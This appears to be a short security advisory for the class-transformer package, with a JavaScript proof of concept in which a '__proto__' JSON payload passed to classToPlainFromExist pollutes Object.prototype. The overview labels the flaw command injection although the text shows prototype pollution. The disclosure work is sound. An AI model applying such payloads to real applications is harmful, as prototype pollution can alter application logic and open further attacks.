# Overview

Affected versions of this package are vulnerable to Command Injection. the `classToPlainFromExist` function could be tricked into adding or modifying properties of `Object.prototype` using a `__proto__` payload.

# POC

```js
var root = require("class-transformer");
var payload = JSON.parse('{"__proto__": {"huntr": "dev"}}');
root.classToPlainFromExist(payload, {});
console.log({}.huntr);
```
